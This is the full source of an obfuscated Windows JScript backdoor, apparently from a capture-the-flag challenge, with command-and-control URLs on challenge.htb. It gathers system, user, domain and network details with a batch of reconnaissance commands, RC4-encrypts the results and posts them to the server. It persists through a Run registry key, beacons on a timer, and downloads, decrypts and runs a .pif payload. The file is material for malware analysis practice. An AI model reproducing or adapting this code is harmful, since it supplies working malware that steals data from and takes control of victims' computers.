function S7EN(KL3M) {
    var gfjd = WScript.CreateObject("ADODB.Stream");
    gfjd.Type = 2;
    gfjd.CharSet = "437";
    gfjd.Open();
    gfjd.LoadFromFile(KL3M);
    var j3k6 = gfjd.ReadText;
    gfjd.Close();
    return l9BJ(j3k6)
}
var WQuh = new Array("http://challenge.htb/wp-includes/pomo/db.php", "http://challenge.htb/wp-admin/includes/class-wp-upload-plugins-list-table.php");
var zIRF = "KRMLT0G3PHdYjnEm";
var LwHA = new Array("systeminfo > ", "net view >> ", "net view /domain >> ", "tasklist /v >> ", "gpresult /z >> ", "netstat -nao >> ", "ipconfig /all >> ", "arp -a >> ", "net share >> ", "net use >> ", "net user >> ", "net user administrator >> ", "net user /domain >> ", "net user administrator /domain >> ", "set  >> ", "dir %systemdrive%\\Users\\*.* >> ", "dir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.* >> ", "dir %userprofile%\\Desktop\\*.* >> ", 'tasklist /fi "modules eq wow64.dll"  >> ', 'tasklist /fi "modules ne wow64.dll" >> ', 'dir "%programfiles(x86)%" >> ', 'dir "%programfiles%" >> ', "dir %appdata% >>");
var Z6HQ = new ActiveXObject("Scripting.FileSystemObject");
var EBKd = WScript.ScriptName;
var Vxiu = "";
var lDd9 = a0rV();

function DGbq(xxNA, j5zO) {
    char_set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var bzwO = "";
    var sW_c = "";
    for (var i = 0; i < xxNA.length; ++i) {
        var W0Ce = xxNA.charCodeAt(i);
        var o_Nk = W0Ce.toString(2);
        while (o_Nk.length < (j5zO ? 8 : 16)) o_Nk = "0" + o_Nk;
        sW_c += o_Nk;
        while (sW_c.length >= 6) {
            var AaP0 = sW_c.slice(0, 6);
            sW_c = sW_c.slice(6);
            bzwO += this.char_set.charAt(parseInt(AaP0, 2))
        }
    }
    if (sW_c) {
        while (sW_c.length < 6) sW_c += "0";
        bzwO += this.char_set.charAt(parseInt(sW_c, 2))
    }
    while (bzwO.length % (j5zO ? 4 : 8) != 0) bzwO += "=";
    return bzwO
}
var lW6t = [];
lW6t["C7"] = "80";
lW6t["FC"] = "81";
lW6t["E9"] = "82";
lW6t["E2"] = "83";
lW6t["E4"] = "84";
lW6t["E0"] = "85";
lW6t["E5"] = "86";
lW6t["E7"] = "87";
lW6t["EA"] = "88";
lW6t["EB"] = "89";
lW6t["E8"] = "8A";
lW6t["EF"] = "8B";
lW6t["EE"] = "8C";
lW6t["EC"] = "8D";
lW6t["C4"] = "8E";
lW6t["C5"] = "8F";
lW6t["C9"] = "90";
lW6t["E6"] = "91";
lW6t["C6"] = "92";
lW6t["F4"] = "93";
lW6t["F6"] = "94";
lW6t["F2"] = "95";
lW6t["FB"] = "96";
lW6t["F9"] = "97";
lW6t["FF"] = "98";
lW6t["D6"] = "99";
lW6t["DC"] = "9A";
lW6t["A2"] = "9B";
lW6t["A3"] = "9C";
lW6t["A5"] = "9D";
lW6t["20A7"] = "9E";
lW6t["192"] = "9F";
lW6t["E1"] = "A0";
lW6t["ED"] = "A1";
lW6t["F3"] = "A2";
lW6t["FA"] = "A3";
lW6t["F1"] = "A4";
lW6t["D1"] = "A5";
lW6t["AA"] = "A6";
lW6t["BA"] = "A7";
lW6t["BF"] = "A8";
lW6t["2310"] = "A9";
lW6t["AC"] = "AA";
lW6t["BD"] = "AB";
lW6t["BC"] = "AC";
lW6t["A1"] = "AD";
lW6t["AB"] = "AE";
lW6t["BB"] = "AF";
lW6t["2591"] = "B0";
lW6t["2592"] = "B1";
lW6t["2593"] = "B2";
lW6t["2502"] = "B3";
lW6t["2524"] = "B4";
lW6t["2561"] = "B5";
lW6t["2562"] = "B6";
lW6t["2556"] = "B7";
lW6t["2555"] = "B8";
lW6t["2563"] = "B9";
lW6t["2551"] = "BA";
lW6t["2557"] = "BB";
lW6t["255D"] = "BC";
lW6t["255C"] = "BD";
lW6t["255B"] = "BE";
lW6t["2510"] = "BF";
lW6t["2514"] = "C0";
lW6t["2534"] = "C1";
lW6t["252C"] = "C2";
lW6t["251C"] = "C3";
lW6t["2500"] = "C4";
lW6t["253C"] = "C5";
lW6t["255E"] = "C6";
lW6t["255F"] = "C7";
lW6t["255A"] = "C8";
lW6t["2554"] = "C9";
lW6t["2569"] = "CA";
lW6t["2566"] = "CB";
lW6t["2560"] = "CC";
lW6t["2550"] = "CD";
lW6t["256C"] = "CE";
lW6t["2567"] = "CF";
lW6t["2568"] = "D0";
lW6t["2564"] = "D1";
lW6t["2565"] = "D2";
lW6t["2559"] = "D3";
lW6t["2558"] = "D4";
lW6t["2552"] = "D5";
lW6t["2553"] = "D6";
lW6t["256B"] = "D7";
lW6t["256A"] = "D8";
lW6t["2518"] = "D9";
lW6t["250C"] = "DA";
lW6t["2588"] = "DB";
lW6t["2584"] = "DC";
lW6t["258C"] = "DD";
lW6t["2590"] = "DE";
lW6t["2580"] = "DF";
lW6t["3B1"] = "E0";
lW6t["DF"] = "E1";
lW6t["393"] = "E2";
lW6t["3C0"] = "E3";
lW6t["3A3"] = "E4";
lW6t["3C3"] = "E5";
lW6t["B5"] = "E6";
lW6t["3C4"] = "E7";
lW6t["3A6"] = "E8";
lW6t["398"] = "E9";
lW6t["3A9"] = "EA";
lW6t["3B4"] = "EB";
lW6t["221E"] = "EC";
lW6t["3C6"] = "ED";
lW6t["3B5"] = "EE";
lW6t["2229"] = "EF";
lW6t["2261"] = "F0";
lW6t["B1"] = "F1";
lW6t["2265"] = "F2";
lW6t["2264"] = "F3";
lW6t["2320"] = "F4";
lW6t["2321"] = "F5";
lW6t["F7"] = "F6";
lW6t["2248"] = "F7";
lW6t["B0"] = "F8";
lW6t["2219"] = "F9";
lW6t["B7"] = "FA";
lW6t["221A"] = "FB";
lW6t["207F"] = "FC";
lW6t["B2"] = "FD";
lW6t["25A0"] = "FE";
lW6t["A0"] = "FF";

function a0rV() {
    var YrUH = Math.ceil(Math.random() * 10 + 25);
    var name = String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
    var JKfG = WScript.CreateObject("WScript.Network");
    Vxiu = JKfG.UserName;
    for (var count = 0; count < YrUH; count++) {
        switch (Math.ceil(Math.random() * 3)) {
            case 1:
                name = name + Math.ceil(Math.random() * 8);
                break;
            case 2:
                name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 97));
                break;
            default:
                name = name + String.fromCharCode(Math.ceil(Math.random() * 24 + 65));
                break
        }
    }
    return name
}
var icVh = Jp6A(HAP5());
try {
    var CJPE = HAP5();
    W6cM();
    Syrl()
} catch (e) {
    WScript.Quit()
}

function Syrl() {
    var m2n0 = xhOC();
    while (true) {
        for (var i = 0; i < WQuh.length; i++) {
            var bx_4 = WQuh[i];
            var czlA = V9iU(bx_4, m2n0);
            switch (czlA) {
                case "good":
                    break;
                case "exit":
                    WScript.Quit();
                    break;
                case "work":
                    eRNv(bx_4);
                    break;
                case "fail":
                    I7UO();
                    break;
                default:
                    break
            }
            a0rV()
        }
        WScript.Sleep((Math.random() * 300 + 3600) * 1e3)
    }
}

function HAP5() {
    var zkDC = this["ActiveXObject"];
    var jVNP = new zkDC("WScript.Shell");
    return jVNP
}

function eRNv(caA2) {
    var jpVh = icVh + EBKd.substring(0, EBKd.length - 2) + "pif";
    var S47T = new ActiveXObject("MSXML2.XMLHTTP");
    S47T.OPEN("post", caA2, false);
    S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
    S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
    S47T.SETREQUESTHEADER("content-length:", "4");
    S47T.SETREQUESTHEADER("Cookie:", "flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=");
    S47T.SEND("work");
    if (Z6HQ.FILEEXISTS(jpVh)) {
        Z6HQ.DELETEFILE(jpVh)
    }
    if (S47T.STATUS == 200) {
        var gfjd = new ActiveXObject("ADODB.STREAM");
        gfjd.TYPE = 1;
        gfjd.OPEN();
        gfjd.WRITE(S47T.responseBody);
        gfjd.Position = 0;
        gfjd.Type = 2;
        gfjd.CharSet = "437";
        var j3k6 = gfjd.ReadText(gfjd.Size);
        var RAKT = t7Nl("2f532d6baec3d0ec7b1f98aed4774843", l9BJ(j3k6));
        Trql(RAKT, jpVh);
        gfjd.Close()
    }
    var lDd9 = a0rV();
    nr3z(jpVh, caA2);
    WScript.Sleep(3e4);
    Z6HQ.DELETEFILE(jpVh)
}

function I7UO() {
    Z6HQ.DELETEFILE(WScript.SCRIPTFULLNAME);
    CJPE.REGDELETE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + EBKd.substring(0, EBKd.length - 3));
    WScript.Quit()
}

function V9iU(pxug, tqDX) {
    try {
        var S47T = new ActiveXObject("MSXML2.XMLHTTP");
        S47T.OPEN("post", pxug, false);
        S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
        S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
        var SoNI = DGbq(tqDX, true);
        S47T.SETREQUESTHEADER("content-length:", SoNI.length);
        S47T.SEND(SoNI);
        return S47T.responseText
    } catch (e) {
        return ""
    }
}

function he50() {
    var wXgO = "";
    var JKfG = WScript.CreateObject("WScript.Network");
    var SoNI = zIRF + JKfG.ComputerName + Vxiu;
    for (var i = 0; i < 16; i++) {
        var DXHy = 0;
        for (var j = i; j < SoNI.length - 1; j++) {
            DXHy = DXHy ^ SoNI.charCodeAt(j)
        }
        DXHy = DXHy % 10;
        wXgO = wXgO + DXHy.toString(10)
    }
    wXgO = wXgO + zIRF;
    return wXgO
}

function W6cM() {
    v_FileName = icVh + EBKd.substring(0, EBKd.length - 2) + "js";
    Z6HQ.COPYFILE(WScript.ScriptFullName, icVh + EBKd);
    var zIqu = (Math.random() * 150 + 350) * 1e3;
    WScript.Sleep(zIqu);
    CJPE.REGWRITE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + EBKd.substring(0, EBKd.length - 3), "wscript.exe //B " + String.fromCharCode(34) + icVh + EBKd + String.fromCharCode(34) + " NPEfpRZ4aqnh1YuGwQd0", "REG_SZ")
}

function xhOC() {
    var U5rJ = icVh + "~dat.tmp";
    for (var i = 0; i < LwHA.length; i++) {
        CJPE.Run("cmd.exe /c " + LwHA[i] + '"' + U5rJ + "", 0, true)
    }
    var jxHd = S7EN(U5rJ);
    WScript.Sleep(1e3);
    Z6HQ.DELETEFILE(U5rJ);
    return t7Nl("2f532d6baec3d0ec7b1f98aed4774843", jxHd)
}

function nr3z(jpVh, caA2) {
    try {
        if (Z6HQ.FILEEXISTS(jpVh)) {
            CJPE.Run('"' + jpVh + '"')
        }
    } catch (e) {
        var S47T = new ActiveXObject("MSXML2.XMLHTTP");
        S47T.OPEN("post", caA2, false);
        var ND3M = "error";
        S47T.SETREQUESTHEADER("user-agent:", "Mozilla/5.0 (Windows NT 6.1; Win64; x64); " + he50());
        S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
        S47T.SETREQUESTHEADER("content-length:", ND3M.length);
        S47T.SEND(ND3M);
        return ""
    }
}

function poBP(QQDq) {
    var HiEg = "0123456789ABCDEF";
    var L9qj = HiEg.substr(QQDq & 15, 1);
    while (QQDq > 15) {
        QQDq >>>= 4;
        L9qj = HiEg.substr(QQDq & 15, 1) + L9qj
    }
    return L9qj
}

function JbVq(x4hL) {
    return parseInt(x4hL, 16)
}

function l9BJ(Wid9) {
    var wXgO = [];
    var pV8q = Wid9.length;
    for (var i = 0; i < pV8q; i++) {
        var yWql = Wid9.charCodeAt(i);
        if (yWql >= 128) {
            var h = lW6t["" + poBP(yWql)];
            yWql = JbVq(h)
        }
        wXgO.push(yWql)
    }
    return wXgO
}

function Trql(EQ4R, K5X0) {
    var gfjd = WScript.CreateObject("ADODB.Stream");
    gfjd.type = 2;
    gfjd.Charset = "iso-8859-1";
    gfjd.Open();
    gfjd.WriteText(EQ4R);
    gfjd.Flush();
    gfjd.Position = 0;
    gfjd.SaveToFile(K5X0, 2);
    gfjd.close()
}

function Jp6A(KgOm) {
    icVh = "c:\\Users\\" + Vxiu + "\\AppData\\Local\\Microsoft\\Windows\\";
    if (!Z6HQ.FOLDEREXISTS(icVh)) icVh = "c:\\Users\\" + Vxiu + "\\AppData\\Local\\Temp\\";
    if (!Z6HQ.FOLDEREXISTS(icVh)) icVh = "c:\\Documents and Settings\\" + Vxiu + "\\Application Data\\Microsoft\\Windows\\";
    return icVh
}

function t7Nl(npmb, AIsp) {
    var M4tj = [];
    var KRYr = 0;
    var FPIW;
    var wXgO = "";
    for (var i = 0; i < 256; i++) {
        M4tj[i] = i
    }
    for (var i = 0; i < 256; i++) {
        KRYr = (KRYr + M4tj[i] + npmb.charCodeAt(i % npmb.length)) % 256;
        FPIW = M4tj[i];
        M4tj[i] = M4tj[KRYr];
        M4tj[KRYr] = FPIW
    }
    var i = 0;
    var KRYr = 0;
    for (var y = 0; y < AIsp.length; y++) {
        i = (i + 1) % 256;
        KRYr = (KRYr + M4tj[i]) % 256;
        FPIW = M4tj[i];
        M4tj[i] = M4tj[KRYr];
        M4tj[KRYr] = FPIW;
        wXgO += String.fromCharCode(AIsp[y] ^ M4tj[(M4tj[i] + M4tj[KRYr]) % 256])
    }
    return wXgO
}